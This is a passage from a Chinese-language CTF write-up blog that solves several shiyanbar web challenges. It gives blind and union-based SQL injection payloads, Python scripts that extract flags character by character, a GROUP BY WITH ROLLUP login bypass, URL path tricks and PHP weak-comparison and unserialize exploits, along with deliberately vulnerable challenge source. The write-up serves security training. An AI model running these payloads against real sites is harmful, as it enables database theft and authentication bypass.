+<p>接下来，我们使用 <strong>payload</strong> ： <strong>1’ and if(substr((select flag from flag),1,1),sleep(3),0) and ‘1</strong> ，发现逗号被过滤了：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/38.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>那么我们可以换成下面这种结构： <strong>1’ and (select case when substr((select flag from flag) from 1 for 1)=’c’ then sleep(3) else 0 end) and ‘1</strong><br><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/39.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure></p>
+<p>接下来编写脚本跑一下就行了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/wonderkun/index.php"</span></span><br><span class="line">chars = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> chars:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span> : <span class="string">"1' and (select case when substr((select flag from flag) from %s for 1)='%s' then sleep(5) else 0 end) and '1"</span> % (i,ch)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += ch</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span>(ch == <span class="string">"&#125;"</span>):</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>这题flag为：<strong>ctf{cdbf14c9551d5be5612f7bb5d2867853}</strong> 因为网络非常不稳定，直接给出flag。</p>
+<h3 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h3><p>网址：<a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/web/</a></p>
+<p>注入点为id,数字型注入，过滤了注释符#，–+，id被单引号包裹</p>
+<p>此外还过滤了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union ,select ,order ,by ,table_schema,column_name,information_schema.columns</span><br></pre></td></tr></table></figure>
+<p>用行注释符代替空格，就不用去考虑过滤的问题，再想办法构造where ‘1，或者select 1 ‘ 闭合最后的单引号</p>
+<p>爆数据库payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/database()/**/%27</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/14.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>爆表payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/ttable_schemaable_schema=%27web1</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/15.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>爆列payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/ccolumn_nameolumn_name/**/from/**/infinformation_schema.columnsormation_schema.columns/**/where/**/table_name=%27flag</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/16.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>爆数据payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/flag/**/from/**/flag/**/where/**/%271</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/17.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h3 id="简单的sql注入之2"><a href="#简单的sql注入之2" class="headerlink" title="简单的sql注入之2"></a>简单的sql注入之2</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/index_2.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_2.php</a></p>
+<p>同样注入点是id，数字型注入，过滤了空格，用行注释符代替即可</p>
+<p>爆库payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/database()/**/%23</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/18.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>爆表payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=%27web1</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/19.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>爆列payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=%27flag</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/20.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>爆数据payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27/**/union/**/select/**/flag/**/from/**/flag/**/%23</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/21.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h3 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/index_3.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php</a></p>
+<p>有查询结果返回hello，无结果则不返回，有报错信息，但是过滤了extractvalue和updatexml，所以选择用基于布尔的盲注</p>
+<p>python脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">all_string = <span class="string">'''qwertyuiopasdfghjklzxcvbnm&#123;&#125;QWERTYUIOPASDFGHJKLZXCVBNM@_1234567890 '''</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="comment">#数据库名:web1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(1,100):</span></span><br><span class="line"><span class="string">	for j in all_string:</span></span><br><span class="line"><span class="string">		f = 0</span></span><br><span class="line"><span class="string">		print('checking '+j)</span></span><br><span class="line"><span class="string">		url = "http://ctf5.shiyanbar.com/web/index_3.php?id=1' and ascii(substr((select database()),%s,1))=%s--+"%(str(i),ord(j))</span></span><br><span class="line"><span class="string">		r = requests.get(url)</span></span><br><span class="line"><span class="string">		if "Hello!" in r.text:</span></span><br><span class="line"><span class="string">			print('The '+str(i)+' place of database is: '+j)</span></span><br><span class="line"><span class="string">			database = database + j</span></span><br><span class="line"><span class="string">			f = 1</span></span><br><span class="line"><span class="string">			break</span></span><br><span class="line"><span class="string">	if f == 0 and j == '?':</span></span><br><span class="line"><span class="string">		break</span></span><br><span class="line"><span class="string">print('database: '+database)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#flag:</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">		f = <span class="number">0</span></span><br><span class="line">		print(<span class="string">'checking '</span>+j)</span><br><span class="line">		url = <span class="string">"http://ctf5.shiyanbar.com/web/index_3.php?id=1' and ascii(substr((select flag from flag),%s,1))=%s--+"</span>%(str(i),ord(j))</span><br><span class="line">		r = requests.get(url)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Hello!"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			print(<span class="string">'The '</span>+str(i)+<span class="string">' place of flag is: '</span>+j)</span><br><span class="line">			flag = flag + j</span><br><span class="line">			f = <span class="number">1</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="string">' '</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h3 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/index.php</a></p>
+<p>源代码给出了提示：source.txt </p>
+<p>访问得到源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&apos;uname&apos;]) || !isset($_POST[&apos;pwd&apos;])) &#123;</span><br><span class="line">	echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;input type=&quot;submit&quot; /&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;/form&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;!--source: source.txt--&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;  </span><br><span class="line">    if (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123;   </span><br><span class="line">        print &quot;姘村彲杞借垷锛屼害鍙禌鑹囷紒&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;</span><br><span class="line">foreach($_POST as $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">	die(&apos;Could not connect: &apos; . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=&quot;XXXXXX&quot;;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql=&quot;SELECT * FROM interest WHERE uname = &apos;&#123;$_POST[&apos;uname&apos;]&#125;&apos;&quot;;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line">if (mysql_num_rows($query) == 1) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) &#123;</span><br><span class="line">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        print &quot;浜﹀彲璧涜墖锛�&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	print &quot;涓€棰楄禌鑹囷紒&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>审计代码，得到flag的思路：</p>
+<p>1.需要POST两个参数uname和pwd</p>
+<p>2.经过sql查询后返回的结果行数必须为1</p>
+<p>3.查询结果的pwd字段必须等于我们POST的参数pwd值</p>
+<p>这里过滤了关键字and，select，from，where，union，join，sleep，benchmark，(，)，逗号</p>
+<p>我们必须控制查询结果的pwd字段，而这里union被过滤了，基于布尔的盲注也不行</p>
+<p>解决方法是用with rollup，它的作用是在查询结果的最后一行添加null，但是必须配合group by来使用</p>
+<p>在本地数据库测试：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/22.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>所以我们可以通过group by pwd with rollup来返回一行查询结果，其中pwd列下的数据为NULL，然后POST的参数pwd赋值为空，就可以控制两个参数相等</p>
+<p>那么我们接下来就是控制查询行数为1</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/23.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>通过limit 1来控制查询行数为1，但是还要返回NULL的那行，这里逗号被过滤了，可以使用 limit 1 offset 0</p>
+<p>，效果跟limit 0,1是一样的</p>
+<p>所以最终的payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&apos; or 1 group by pwd with rollup limit 1 offset 2#&amp;pwd=</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/24.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h3 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/10/10.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/10/10.php</a></p>
+<p>burp抓包发现响应头部存在FLAG字段</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/25.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>FLAG字段经过BASE64加密</p>
+<p>解密后post参数key等于解密后的值</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/26.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>没有得到flag，发现头部FLAG字段值又发生了变化，想起题目可能要快速提交flag，可能要写脚本提交key</p>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/10/10.php"</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">FLAG = base64.b64decode(r.headers[<span class="string">'FLAG'</span>])</span><br><span class="line">FLAG = bytes.decode(FLAG)</span><br><span class="line">FLAG = FLAG.split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'key'</span>:FLAG</span><br><span class="line">    &#125;</span><br><span class="line">r = requests.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<p>运行结果：CTF{Y0U_4R3_1NCR3D1BL3_F4ST!}</p>
+<h3 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h3><p>网址：<a href="http://ctf5.shiyanbar.com/indirection/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/indirection/index.php</a></p>
+<p>给出了源代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">// code by SEC@USTC </span><br><span class="line"></span><br><span class="line">echo &apos;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;charset&quot; content=&quot;gbk&quot;&gt;&lt;/head&gt;&lt;body&gt;&apos;; </span><br><span class="line"></span><br><span class="line">$URL = $_SERVER[&apos;REQUEST_URI&apos;]; </span><br><span class="line">//echo &apos;URL: &apos;.$URL.&apos;&lt;br/&gt;&apos;; </span><br><span class="line">$flag = &quot;CTF&#123;???&#125;&quot;; </span><br><span class="line"></span><br><span class="line">$code = str_replace($flag, &apos;CTF&#123;???&#125;&apos;, file_get_contents(&apos;./index.php&apos;)); </span><br><span class="line">$stop = 0; </span><br><span class="line"></span><br><span class="line">//这道题目本身也有教学的目的 </span><br><span class="line">//第一，我们可以构造 /indirection/a/../ /indirection/./ 等等这一类的 </span><br><span class="line">//所以，第一个要求就是不得出现 ./ </span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;./&apos;) !== FALSE)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 1;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第二，我们可以构造 \ 来代替被过滤的 / </span><br><span class="line">//所以，第二个要求就是不得出现 ../ </span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;\\&apos;) !== FALSE)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 2;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第三，有的系统大小写通用，例如 indirectioN/ </span><br><span class="line">//你也可以用?和#等等的字符绕过，这需要统一解决 </span><br><span class="line">//所以，第三个要求对可以用的字符做了限制，a-z / 和 . </span><br><span class="line">$matches = array(); </span><br><span class="line">preg_match(&apos;/^([0-9a-z\/.]+)$/&apos;, $URL, $matches); </span><br><span class="line">if($flag &amp;&amp; empty($matches) || $matches[1] != $URL)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 3;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第四，多个 / 也是可以的 </span><br><span class="line">//所以，第四个要求是不得出现 // </span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;//&apos;) !== FALSE)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 4;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第五，显然加上index.php或者减去index.php都是可以的 </span><br><span class="line">//所以我们下一个要求就是必须包含/index.php，并且以此结尾 </span><br><span class="line">if($flag &amp;&amp; substr($URL, -10) !== &apos;/index.php&apos;)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 5;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第六，我们知道在index.php后面加.也是可以的 </span><br><span class="line">//所以我们禁止p后面出现.这个符号 </span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;p.&apos;) !== FALSE)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 6;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第七，现在是最关键的时刻 </span><br><span class="line">//你的$URL必须与/indirection/index.php有所不同 </span><br><span class="line">if($flag &amp;&amp; $URL == &apos;/indirection/index.php&apos;)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 7;        //Pass </span><br><span class="line">&#125; </span><br><span class="line">if(!$stop) $stop = 8; </span><br><span class="line"></span><br><span class="line">echo &apos;Flag: &apos;.$flag; </span><br><span class="line">echo &apos;&lt;hr /&gt;&apos;; </span><br><span class="line">for($i = 1; $i &lt; $stop; $i++) </span><br><span class="line">    $code = str_replace(&apos;//Pass &apos;.$i, &apos;//Pass&apos;, $code); </span><br><span class="line">for(; $i &lt; 8; $i++) </span><br><span class="line">    $code = str_replace(&apos;//Pass &apos;.$i, &apos;//Not Pass&apos;, $code); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo highlight_string($code, TRUE); </span><br><span class="line"></span><br><span class="line">echo &apos;&lt;/body&gt;&lt;/html&gt;&apos;;</span><br></pre></td></tr></table></figure>
+<p>绕过思路源代码都给出了提示，考察的是url伪静态，比如url中含有xxxx.php/xx/x，那么.php后的xx就会被当成参数名，x会被当成参数</p>
+<p>所以可以构造payload:<a href="http://ctf5.shiyanbar.com/indirection/index.php/a/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/indirection/index.php/a/index.php</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/实验吧Web/27.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h3 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h3><p>网址：<a href="http://ctf5.shiyanbar.com/10/main.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/10/main.php</a></p>
+<p>burp抓包试着修改showsouce参数=1</p>
+<p>提示了源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a = $_POST[&quot;PIN&quot;];</span><br><span class="line">if ($a == -19827747736161128312837161661727773716166727272616149001823847) &#123;</span><br><span class="line">    echo &quot;Congratulations! The flag is $flag&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;User with provided PIN not found.&quot;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>POST参数PIN等于-19827747736161128312837161661727773716166727272616149001823847</p>
+<p>拿到flag</p>
+<h3 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h3><p>网址：<a href="http://ctf5.shiyanbar.com/10/web1/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/10/web1/index.php</a></p>
+<p>首先源代码给出了提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $test=$_GET[&apos;username&apos;]; $test=md5($test); if($test==&apos;0&apos;) --&gt;</span><br></pre></td></tr></table></figure>
+<p>这里应该是POST参数username，然后加密后的值 == ‘0’</p>
+<p>这里涉及PHP的弱类型比较，== 比较时，PHP会将数字字符串的数字值取出进行比较，例如’0’ == ‘0abc’</p>
+<p>所以我们只需要找到一个md5加密后的值0开头的字符串即可，典型的为240610708 和 QNKCDZO </p>
+<p>POST参数username=240610708得到/user.php?fame=hjkleffifer</p>
+<p>访问后又得到一串代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$unserialize_str = $_POST[&apos;password&apos;];</span><br><span class="line">     $data_unserialize = unserialize($unserialize_str);</span><br><span class="line">     if($data_unserialize[&apos;user&apos;] == &apos;???&apos; &amp;&amp; $data_unserialize[&apos;pass&apos;]==&apos;???&apos;)</span><br><span class="line">     &#123;</span><br><span class="line">       print_r($flag);</span><br><span class="line">     &#125;</span><br><span class="line">伟大的科学家php方言道：成也布尔，败也布尔。</span><br><span class="line">回去吧骚年</span><br></pre></td></tr></table></figure>
+<p>审计后发现需要POST一个序列化后的值，使得反序列化后的数组user键的值和pass键的值 == 未知字符串，题目还给出了提示“成也布尔，败也布尔”，这里又需要利用PHP弱类型比较，当布尔类型的true与任何字符串弱类型相等</p>
+<p>本地测试得到序列化后的值</p>
